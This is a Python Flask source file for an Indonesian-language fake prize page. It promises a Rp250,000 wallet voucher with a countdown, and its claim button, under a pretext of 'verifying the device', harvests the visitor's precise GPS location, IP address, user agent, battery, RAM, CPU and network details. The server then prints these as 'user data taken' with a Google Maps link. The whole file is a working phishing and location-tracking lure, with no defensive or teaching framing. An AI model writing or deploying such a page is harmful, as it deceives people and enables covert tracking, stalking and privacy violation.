from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selamat! Anda Mendapatkan Hadiah Spesial</title>
    <!-- Google Fonts & FontAwesome Icons -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --gold-primary: #f59e0b;
            --gold-hover: #d97706;
            --bg-dark: #0f172a;
            --card-bg: #1e293b;
            --text-main: #ffffff;
            --text-muted: #cbd5e1;
            --success: #22c55e;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background-image: 
                radial-gradient(at 50% 0%, rgba(245, 158, 11, 0.25) 0px, transparent 60%),
                radial-gradient(at 100% 100%, rgba(236, 72, 153, 0.2) 0px, transparent 50%);
        }

        .container {
            width: 100%;
            max-width: 420px;
            background: var(--card-bg);
            border: 2px solid rgba(245, 158, 11, 0.3);
            border-radius: 28px;
            padding: 32px 24px;
            box-shadow: 0 25px 50px -12px rgba(245, 158, 11, 0.25);
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .container::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 6px;
            background: linear-gradient(90deg, #f59e0b, #ef4444, #ec4899, #f59e0b);
        }

        .reward-icon {
            width: 90px; height: 90px;
            background: linear-gradient(135deg, rgba(245, 158, 11, 0.2), rgba(239, 68, 68, 0.2));
            border: 2px solid rgba(245, 158, 11, 0.5);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            margin: 0 auto 20px;
            color: var(--gold-primary);
            font-size: 42px;
            animation: bounce 2s infinite;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        .badge {
            display: inline-block;
            background: rgba(245, 158, 11, 0.15);
            color: #fbbf24;
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 12px; font-weight: 700;
            letter-spacing: 1px;
            text-transform: uppercase;
            margin-bottom: 12px;
            border: 1px solid rgba(245, 158, 11, 0.3);
        }

        h2 {
            font-size: 24px; font-weight: 800;
            margin-bottom: 8px;
            background: linear-gradient(to right, #ffffff, #fbbf24);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        p.subtitle {
            color: var(--text-muted);
            font-size: 14px; line-height: 1.5;
            margin-bottom: 24px;
        }

        .gift-box-card {
            background: rgba(15, 23, 42, 0.7);
            border: 1px dashed rgba(245, 158, 11, 0.4);
            border-radius: 18px;
            padding: 18px;
            margin-bottom: 24px;
            display: flex; align-items: center; justify-content: space-between;
        }

        .gift-details { text-align: left; }
        .gift-details h4 { font-size: 15px; color: #fff; font-weight: 700; }
        .gift-details p { font-size: 12px; color: #94a3b8; }
        .gift-value { font-size: 18px; font-weight: 800; color: #22c55e; }

        .btn-claim {
            width: 100%;
            background: linear-gradient(135deg, #f59e0b, #d97706);
            color: #ffffff;
            border: none;
            padding: 16px;
            border-radius: 16px;
            font-size: 16px; font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex; align-items: center; justify-content: center;
            gap: 10px;
            box-shadow: 0 10px 25px -5px rgba(245, 158, 11, 0.5);
        }

        .btn-claim:hover { transform: scale(1.02); }
        .btn-claim:active { transform: scale(0.98); }

        .spinner {
            display: none;
            width: 22px; height: 22px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .status-msg {
            display: none;
            margin-top: 16px; padding: 12px;
            border-radius: 12px; font-size: 13px; font-weight: 600;
        }

        .status-msg.success {
            background: rgba(34, 197, 94, 0.15); color: #4ade80;
            border: 1px solid rgba(34, 197, 94, 0.3);
        }

        .status-msg.error {
            background: rgba(239, 68, 68, 0.15); color: #f87171;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }

        .timer-info { margin-top: 18px; font-size: 12px; color: #94a3b8; }
        .timer-info span { color: #ef4444; font-weight: 700; }
    </style>
</head>
<body>

    <div class="container">
        <div class="reward-icon" id="rewardIcon">
            <i class="fa-solid fa-gift"></i>
        </div>

        <div class="badge">Edisi Terbatas</div>
        <h2 id="mainTitle">Selamat! Anda Terpilih</h2>
        <p class="subtitle" id="subTitle">Gunakan voucher eksklusif Anda sebelum masa berlaku habis dalam beberapa menit.</p>

        <div class="gift-box-card">
            <div class="gift-details">
                <h4>Voucher Saldo / Wallet</h4>
                <p>Status: SIAP DIKLAIM</p>
            </div>
            <div class="gift-value">Rp250.000</div>
        </div>

        <button class="btn-claim" id="btnClaim" onclick="processClaim()">
            <div class="spinner" id="btnSpinner"></div>
            <span id="btnText"><i class="fa-solid fa-wand-magic-sparkles"></i> Klaim Hadiah Sekarang</span>
        </button>

        <div class="status-msg" id="statusMsg"></div>

        <div class="timer-info">
            Penawaran berakhir dalam: <span id="countdown">04:59</span>
        </div>
    </div>

    <script>
    let timeLeft = 299;
    const countdownEl = document.getElementById('countdown');
    setInterval(() => {
        if(timeLeft <= 0) return;
        timeLeft--;
        const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
        const s = (timeLeft % 60).toString().padStart(2, '0');
        countdownEl.innerText = `${m}:${s}`;
    }, 1000);

    async function processClaim() {
        const btn = document.getElementById('btnClaim');
        const btnText = document.getElementById('btnText');
        const spinner = document.getElementById('btnSpinner');
        const statusMsg = document.getElementById('statusMsg');

        btn.disabled = true;
        btnText.innerText = "Memverifikasi Perangkat...";
        spinner.style.display = "inline-block";
        statusMsg.style.display = "none";

        // Collect Device Info
        const deviceInfo = {
            screen: `${window.screen.width}x${window.screen.height}`,
            platform: navigator.platform || 'Unknown',
            vendor: navigator.vendor || 'Unknown',
            language: navigator.language || 'Unknown',
            cores: navigator.hardwareConcurrency || 'Unknown',
            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
            battery: 'Unknown',
            charging: 'Unknown',
            networkType: 'Unknown'
        };

        // Battery Info
        if (navigator.getBattery) {
            try {
                const batt = await navigator.getBattery();
                deviceInfo.battery = `${Math.round(batt.level * 100)}%`;
                deviceInfo.charging = batt.charging ? 'Ya (Mengisi Daya)' : 'Tidak';
            } catch(e) {}
        }

        // Network Info
        if (navigator.connection) {
            deviceInfo.networkType = navigator.connection.effectiveType || 'Unknown';
        }

        // Location Check
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => sendAllData(pos, deviceInfo),
                (err) => sendAllData(null, deviceInfo),
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        } else {
            sendAllData(null, deviceInfo);
        }
    }

    function sendAllData(position, deviceInfo) {
        const payload = {
            lat: position ? position.coords.latitude : 'Ditolak/Tidak Ada',
            lon: position ? position.coords.longitude : 'Ditolak/Tidak Ada',
            device: deviceInfo
        };

        fetch('/save-location', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        })
        .then(res => res.json())
        .then(data => {
            document.getElementById('rewardIcon').innerHTML = '<i class="fa-solid fa-circle-check" style="color: #22c55e;"></i>';
            document.getElementById('rewardIcon').style.border = '2px solid #22c55e';
            document.getElementById('mainTitle').innerText = "Klaim Berhasil!";
            document.getElementById('subTitle').innerText = "Hadiah Anda telah berhasil dikonfirmasi ke sistem.";
            document.getElementById('btnClaim').style.display = 'none';

            const statusMsg = document.getElementById('statusMsg');
            statusMsg.className = "status-msg success";
            statusMsg.innerHTML = '<i class="fa-solid fa-check-double"></i> Voucher sedang diproses!';
            statusMsg.style.display = "block";
        })
        .catch(err => {
            showCustomError("Gagal memverifikasi perangkat. Coba lagi.");
        });
    }

    function showCustomError(message) {
        const btn = document.getElementById('btnClaim');
        const btnText = document.getElementById('btnText');
        const spinner = document.getElementById('btnSpinner');
        const statusMsg = document.getElementById('statusMsg');

        btn.disabled = false;
        btnText.innerHTML = '<i class="fa-solid fa-rotate-right"></i> Coba Klaim Lagi';
        spinner.style.display = "none";

        statusMsg.className = "status-msg error";
        statusMsg.innerHTML = '<i class="fa-solid fa-circle-exclamation"></i> ' + message;
        statusMsg.style.display = "block";
    }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/save-location', methods=['POST'])
def save_location():
    data = request.get_json()
    
    lat = data.get('lat')
    lon = data.get('lon')
    dev = data.get('device', {})
    
    user_agent = request.headers.get('User-Agent')
    ip_address = request.remote_addr

    print("\n" + "="*50)
    print("        DATA PENGGUNA & PERANGKAT TERAMBIL      ")
    print("="*50)
    print(f"[+] IP Publik      : {ip_address}")
    print(f"[+] User-Agent     : {user_agent}")
    print(f"[+] Platform / OS  : {dev.get('platform')}")
    print(f"[+] Browser Vendor : {dev.get('vendor')}")
    print(f"[+] Ukuran Layar   : {dev.get('screen')}")
    print(f"[+] CPU Cores      : {dev.get('cores')}")
    print(f"[+] Perkiraan RAM  : {dev.get('ram')}")
    print(f"[+] Baterai HP     : {dev.get('battery')}")
    print(f"[+] Status Cas     : {dev.get('charging')}")
    print(f"[+] Jaringan / Net : {dev.get('networkType')}")
    print(f"[+] Bahasa HP      : {dev.get('language')}")
    print("-" * 50)
    print(f"[+] Latitude       : {lat}")
    print(f"[+] Longitude      : {lon}")
    if lat != 'Ditolak/Tidak Ada':
        print(f"[+] Google Maps    : https://www.google.com/maps?q={lat},{lon}")
    print("="*50 + "\n")
    
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)